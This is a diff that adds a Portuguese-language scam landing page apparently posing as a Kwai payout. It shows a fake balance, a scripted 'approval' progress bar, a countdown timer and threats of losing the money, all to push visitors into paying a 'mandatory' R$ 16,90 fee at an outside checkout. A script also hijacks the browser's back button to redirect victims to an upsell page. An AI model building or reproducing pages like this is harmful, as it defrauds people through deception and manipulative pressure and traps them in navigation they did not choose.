@@ -1,0 +1,738 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<script src="js/utm-handler.js" data-token="7a394605-1983-4c36-98cc-7194d19aa9b4" data-click-id-param="click_id">
+</script>
+
+    <meta charset="UTF-8">
+    <title>🎉 Parabéns! Saldo Liberado Para Saque</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="robots" content="max-image-preview:large">
+
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        -webkit-tap-highlight-color: transparent;
+      }
+
+      body {
+        font-family: "Inter", -apple-system, BlinkMacSystemFont, sans-serif;
+        background: linear-gradient(135deg, #0963a8 0%, #064a7a 100%);
+        min-height: 100vh;
+        color: #333;
+        line-height: 1.5;
+        overflow-x: hidden;
+        padding: 10px;
+      }
+
+      .container {
+        max-width: 100%;
+        margin: 0 auto;
+        padding: 0;
+      }
+
+      /* Seção do topo com imagem e saldo */
+      .top-section {
+        background: rgba(255, 255, 255, 0.98);
+        border-radius: 16px;
+        padding: 20px;
+        text-align: center;
+        margin-bottom: 15px;
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
+        position: relative;
+        overflow: hidden;
+      }
+
+      .top-section::before {
+        content: "";
+        position: absolute;
+        top: -50%;
+        left: -50%;
+        width: 200%;
+        height: 200%;
+        background: linear-gradient(
+          45deg,
+          transparent,
+          rgba(9, 99, 168, 0.05),
+          transparent
+        );
+        animation: shine 3s infinite;
+      }
+
+      @keyframes shine {
+        0% {
+          transform: translateX(-100%) translateY(-100%) rotate(45deg);
+        }
+        100% {
+          transform: translateX(100%) translateY(100%) rotate(45deg);
+        }
+      }
+
+      .logo-image {
+        width: 100%;
+        max-width: 280px;
+        height: auto;
+        border-radius: 8px;
+      }
+
+      .saldo-display {
+        background: linear-gradient(135deg, #0963a8, #064a7a);
+        color: white;
+        border-radius: 12px;
+        box-shadow: 0 6px 20px rgba(9, 99, 168, 0.3);
+        position: relative;
+        z-index: 1;
+        display: flex;
+      }
+
+      .saldo-label {
+        font-size: 16px;
+        font-weight: 500;
+        margin-bottom: 8px;
+        opacity: 0.95;
+      }
+
+      .saldo-valor {
+        font-size: 32px;
+        font-weight: 800;
+        margin-bottom: 8px;
+        text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.2);
+      }
+
+      .saldo-status {
+        font-size: 13px;
+        font-weight: 600;
+        background: rgba(255, 255, 255, 0.25);
+        padding: 6px 12px;
+        border-radius: 20px;
+        display: inline-block;
+      }
+
+      /* Badges de confiança mobile */
+      .trust-badges {
+        display: flex;
+        justify-content: center;
+        gap: 8px;
+        margin: 15px 0 0 0;
+        flex-wrap: wrap;
+      }
+
+      .trust-badge {
+        background: rgba(9, 99, 168, 0.1);
+        color: #0963a8;
+        padding: 6px 10px;
+        border-radius: 15px;
+        font-size: 10px;
+        font-weight: 600;
+        border: 1px solid rgba(9, 99, 168, 0.2);
+      }
+
+      /* Seção principal */
+      .main-content {
+        background: white;
+        border-radius: 16px;
+        padding: 20px;
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
+        margin-bottom: 15px;
+      }
+
+      /* Alerta de atenção mobile */
+      .alert-box {
+        background: linear-gradient(135deg, #e74c3c, #c0392b);
+        color: white;
+        padding: 20px;
+        border-radius: 12px;
+        text-align: center;
+        margin-bottom: 20px;
+        box-shadow: 0 6px 20px rgba(231, 76, 60, 0.3);
+        animation: pulse-gentle 3s infinite;
+      }
+
+      @keyframes pulse-gentle {
+        0%,
+        100% {
+          transform: scale(1);
+        }
+        50% {
+          transform: scale(1.01);
+        }
+      }
+
+      .alert-title {
+        font-size: 20px;
+        font-weight: 800;
+        margin-bottom: 12px;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+      }
+
+      .alert-text {
+        font-size: 14px;
+        font-weight: 500;
+        line-height: 1.4;
+      }
+
+      /* Timer de urgência mobile */
+      .urgency-timer {
+        background: rgba(231, 76, 60, 0.1);
+        border: 2px solid #e74c3c;
+        border-radius: 10px;
+        padding: 12px;
+        text-align: center;
+        margin: 15px 0;
+      }
+
+      .timer-text {
+        font-size: 12px;
+        font-weight: 600;
+        color: white;
+        margin-bottom: 6px;
+      }
+
+      .timer-display {
+        font-size: 20px;
+        font-weight: 800;
+        color: white;
+        font-family: "Courier New", monospace;
+      }
+
+      /* Seção de parabéns mobile */
+      .congratulations {
+        text-align: center;
+        margin-bottom: 20px;
+      }
+
+      .congrats-title {
+        font-size: 24px;
+        font-weight: 800;
+        color: #0963a8;
+        margin-bottom: 15px;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+      }
+
+      /* Barra de progresso mobile */
+      .progress-section {
+        margin-bottom: 20px;
+      }
+
+      .progress-container {
+        background: #f0f0f0;
+        border-radius: 20px;
+        padding: 4px;
+        box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.1);
+      }
+
+      .progress-bar {
+        background: linear-gradient(90deg, #0963a8, #064a7a);
+        height: 12px;
+        border-radius: 16px;
+        width: 0%;
+        transition: width 0.1s ease;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .progress-bar::after {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: linear-gradient(
+          90deg,
+          transparent,
+          rgba(255, 255, 255, 0.4),
+          transparent
+        );
+        animation: progress-shine 2s infinite;
+      }
+
+      @keyframes progress-shine {
+        0% {
+          transform: translateX(-100%);
+        }
+        100% {
+          transform: translateX(100%);
+        }
+      }
+
+      .progress-text {
+        text-align: center;
+        margin-top: 8px;
+        font-weight: 600;
+        color: #0963a8;
+        font-size: 13px;
+      }
+
+      /* Seção de explicação da taxa mobile */
+      .fee-explanation {
+        background: linear-gradient(135deg, #0963a8, #064a7a);
+        color: white;
+        padding: 20px;
+        border-radius: 12px;
+        margin-bottom: 20px;
+        text-align: center;
+      }
+
+      .fee-title {
+        font-size: 18px;
+        font-weight: 700;
+        margin-bottom: 12px;
+      }
+
+      .fee-text {
+        font-size: 14px;
+        font-weight: 500;
+        line-height: 1.5;
+      }
+
+      .fee-amount {
+        background: rgba(255, 255, 255, 0.25);
+        padding: 8px 16px;
+        border-radius: 20px;
+        font-weight: 800;
+        font-size: 18px;
+        display: inline-block;
+        margin: 10px 0;
+      }
+
+      .fee-note {
+        font-size: 12px;
+        font-style: italic;
+        opacity: 0.9;
+        margin-top: 8px;
+      }
+
+      /* Botão CTA mobile otimizado */
+      .cta-button {
+        background: linear-gradient(135deg, #0963a8, #064a7a);
+        color: white;
+        border: none;
+        padding: 18px 25px;
+        font-size: 16px;
+        font-weight: 700;
+        border-radius: 50px;
+        cursor: pointer;
+        width: 100%;
+        margin-bottom: 20px;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        transition: all 0.3s ease;
+        box-shadow: 0 8px 25px rgba(60, 123, 231, 0.4);
+        position: relative;
+        overflow: hidden;
+        animation: pulse-cta 2.5s infinite;
+        touch-action: manipulation;
+        -webkit-appearance: none;
+      }
+
+      @keyframes pulse-cta {
+        0%,
+        100% {
+          transform: scale(1);
+          box-shadow: 0 8px 25px rgba(231, 76, 60, 0.4);
+        }
+        50% {
+          transform: scale(1.02);
+          box-shadow: 0 10px 30px rgba(231, 76, 60, 0.6);
+        }
+      }
+
+      .cta-button:active {
+        transform: scale(0.98);
+        transition: transform 0.1s;
+      }
+
+      .cta-button::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(
+          90deg,
+          transparent,
+          rgba(255, 255, 255, 0.3),
+          transparent
+        );
+        transition: left 0.5s;
+      }
+
+      .cta-button:active::before {
+        left: 100%;
+      }
+
+      /* Seção de dúvidas mobile */
+      .faq-section {
+        background: #f8f9fa;
+        border-radius: 12px;
+        padding: 18px;
+        color: #666;
+      }
+
+      .faq-title {
+        font-size: 16px;
+        font-weight: 700;
+        color: #0963a8;
+        margin-bottom: 15px;
+        text-align: center;
+      }
+
+      .faq-item {
+        margin-bottom: 12px;
+      }
+
+      .faq-question {
+        font-size: 14px;
+        font-weight: 600;
+        color: #333;
+        margin-bottom: 4px;
+      }
+
+      .faq-answer {
+        font-size: 13px;
+        line-height: 1.4;
+        color: #666;
+      }
+      #p1 {
+        width: 100%;
+        background: rgba(255, 255, 255, 0.98);
+        padding: 20px;
+        border-radius: 16px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 20px;
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
+        backdrop-filter: blur(10px);
+        position: relative;
+        overflow: hidden;
+      }
+
+      #p1::before {
+        content: "";
+        position: absolute;
+        top: -50%;
+        left: -50%;
+        width: 200%;
+        height: 200%;
+        background: linear-gradient(
+          45deg,
+          transparent,
+          rgba(9, 99, 168, 0.05),
+          transparent
+        );
+        animation: shine 4s infinite;
+      }
+
+      /* Ajustes específicos para mobile */
+      @media (max-width: 480px) {
+        body {
+          padding: 8px;
+        }
+
+        .top-section,
+        .main-content {
+          padding: 18px;
+          border-radius: 14px;
+        }
+
+        .saldo-valor {
+          font-size: 28px;
+        }
+
+        .congrats-title {
+          font-size: 22px;
+        }
+
+        .alert-title {
+          font-size: 18px;
+        }
+
+        .alert-text {
+          font-size: 13px;
+        }
+
+        .cta-button {
+          padding: 16px 20px;
+          font-size: 15px;
+        }
+
+        .trust-badges {
+          gap: 6px;
+          margin-top: 0px;
+          margin-bottom: 5px;
+        }
+
+        .trust-badge {
+          font-size: 9px;
+          padding: 5px 8px;
+        }
+        #p1,
+        #produto1 {
+          padding: 8px;
+          border-radius: 14px;
+        }
+
+        #logo {
+          width: 100px;
+        }
+      }
+
+      .boxSaldo {
+        background: linear-gradient(135deg, #0963a8, #064a7a);
+        border-radius: 12px;
+        padding: 12px 16px;
+        box-shadow: 0 6px 20px rgba(9, 99, 168, 0.3);
+        position: relative;
+        z-index: 1;
+        color: white;
+      }
+
+      @supports (-webkit-touch-callout: none) {
+        .cta-button {
+          -webkit-appearance: none;
+          -webkit-tap-highlight-color: transparent;
+        }
+      }
+
+      .saldo-display {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        background: linear-gradient(135deg, #0963a8, #064a7a);
+        color: white;
+        border-radius: 12px;
+        box-shadow: 0 6px 20px rgba(9, 99, 168, 0.3);
+        justify-content: space-around;
+      }
+
+      .logo-image {
+        width: 140px;
+        height: 60px;
+      }
+
+      .saldo-info {
+        display: flex;
+      }
+
+      .saldo-label {
+        font-size: 20px;
+        font-weight: 500;
+        opacity: 0.9;
+      }
+
+      .saldo-valor {
+        font-size: 20px;
+        font-weight: 800;
+        text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.2);
+      }
+
+      .pulsante {
+        display: inline-block;
+        animation: pulsar 1.5s infinite;
+        text-decoration: none;
+      }
+
+      @keyframes pulsar {
+        0% {
+          transform: scale(1);
+          box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
+        }
+        50% {
+          transform: scale(1.1);
+          box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+        }
+        100% {
+          transform: scale(1);
+          box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div id="p1">
+      <img id="logo" src="images/x2.png" alt="Logo Kwai">
+      <div class="boxSaldo">
+        <span class="textoSaldo">SALDO:</span>
+        <span class="valorSaldo">
+          <span id="saldoSpan" class="saldoAtualizado">R$ 1.559,64</span>
+        </span>
+      </div>
+    </div>
+
+    <div class="container">
+      <!-- Seção do topo com imagem e saldo -->
+      <div class="top-section">
+        <div class="trust-badges">
+          <div class="trust-badge">🔒 100% Seguro</div>
+          <div class="trust-badge">⚡ Saque Imediato</div>
+          <div class="trust-badge">✅ +87.000 Usuários</div>
+        </div> <br>
+
+        <!-- Seção de parabéns -->
+        <div class="congratulations">
+          <div class="congrats-title">VOCÊ ESTÁ QUASE LÁ...</div>
+
+          <div class="progress-section">
+            <div class="progress-container">
+              <div class="progress-bar" id="progressBar" style="width: 3%;"></div>
+            </div>
+            <div class="progress-text" id="progressText">Aprovação: 3%</div>
+          </div>
+        </div>
+
+        <!-- Explicação da taxa -->
+        <div class="fee-explanation">
+          <div class="fee-title">🔓 Seu SALDO está garantido!</div>
+          <div class="fee-text">
+            Para acessar o aplicativo e realizar o saque, é necessário efetuar o
+            pagamento da taxa <strong>ANUAL</strong> de cadastro de:
+            <br>
+            <div class="fee-amount">R$ 16,90</div>
+            <div class="fee-note">(OBRIGATÓRIA)</div>
+          </div>
+        </div>
+        <!-- Botão CTA -->
+        <button class="cta-button pulsante" onclick="window.location.href='https://pay.confirmapagamento.site/checkout/cf9f65ba-6bb6-4cf6-a5e3-ee14cb51d5fe' + window.location.search">
+          PAGAR A TAXA E ACESSAR O APP
+        </button>
+        <div class="alert-box">
+          <div class="alert-title">⚠️ ATENÇÃO</div>
+          <div class="alert-text">
+            CASO NÃO REALIZE O SAQUE DE IMEDIATO, SEU SALDO SERÁ REPASSADO PARA
+            UM PRÓXIMO CANDIDATO DA PESQUISA E VOCÊ PERDERÁ 100% DO VALOR GANHO!
+          </div>
+
+          <div class="urgency-timer">
+            <div class="timer-text">⏰ Tempo restante para resgate:</div>
+            <div class="timer-display" id="countdown">15:00</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Conteúdo principal -->
+      <div class="main-content">
+        <!-- Alerta de atenção -->
+
+        <!-- Seção de dúvidas -->
+        <div class="faq-section">
+          <div class="faq-title">❓ DÚVIDAS FREQUENTES</div>
+
+          <div class="faq-item">
+            <div class="faq-question">Por que devo pagar essa taxa?</div>
+            <div class="faq-answer">
+              Cada usuário do nosso aplicativo tem direito a um saque
+              <strong>MENSAL</strong> e através desse valor conseguimos filtrar
+              nossa base de usuários evitando fraudes, além disso esse valor é
+              utilizado para a <strong>manutenção</strong> do aplicativo.
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <div class="faq-question">
+              O que acontece se eu não pagar a taxa?
+            </div>
+            <div class="faq-answer">
+              Caso não seja realizado o pagamento o valor disponível para saque
+              será repassado para um próximo usuário da plataforma que responder
+              a pesquisa.
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <div class="faq-question">O que acontece após eu pagar?</div>
+            <div class="faq-answer">
+              Automaticamente é liberado o aplicativo para que você possa
+              continuar avaliando e realizar a solicitação de saque do seu valor
+              disponível.
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      // Recuperar valor do localStorage
+      const valorSaque = localStorage.getItem("valorSaque") || "R$ 1.559,64";
+      const saldoSpan = document.getElementById("saldoSpan");
+      saldoSpan.textContent = valorSaque;
+
+      // Animação da barra de progresso
+      document.addEventListener("DOMContentLoaded", function () {
+        const progressBar = document.querySelector("#progressBar");
+        const progressPercentage = document.querySelector("#progressText");
+        const maxValue = 95;
+        let currentValue = 0;
+
+        const incrementProgress = () => {
+          if (currentValue < maxValue) {
+            currentValue++;
+            progressBar.style.width = currentValue + "%";
+            progressPercentage.textContent = "Aprovação: " + currentValue + "%";
+            setTimeout(incrementProgress, 25);
+          } else {
+            progressPercentage.innerHTML =
+              "<strong>✅ Aprovado para saque!</strong>";
+            progressPercentage.style.color = "#0963a8";
+          }
+        };
+
+        setTimeout(incrementProgress, 500);
+      });
+
+      // Timer de contagem regressiva
+      let timeLeft = 15 * 60; // 15 minutos
+      const countdownElement = document.getElementById("countdown");
+
+      function updateCountdown() {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        countdownElement.textContent = `${minutes
+          .toString()
+          .padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
+
+        if (timeLeft > 0) {
+          timeLeft--;
+          setTimeout(updateCountdown, 1000);
+        } else {
+          countdownElement.textContent = "00:00";
+          countdownElement.style.color = "#ff0000";
+        }
+      }
+
+      updateCountdown();
+
+      // Script de back redirect
+      const link = "https://spotify-pay-site.preview-domain.com/back-upsell1/";
+
+      function setBackRedirect(url) {
+        let urlBackRedirect = url;
+        urlBackRedirect =
+          urlBackRedirect.trim() +
+          (urlBackRedirect.indexOf("?") > 0 ? "&" : "?") +
+          document.location.search.replace("?", "").toString();
+
+        history.pushState({}, "", location.href);
+        history.pushState({}, "", location.href);
+        history.pushState({}, "", location.href);
+
+        window.addEventListener("popstate", () => {
+          console.log("onpopstate", urlBackRedirect);
+          setTimeout(() => {
+            location.href = urlBackRedirect;
+          }, 1);
+        });
+      }
+
+      setBackRedirect(link);
+    </script>
+  
+
+</body></html>
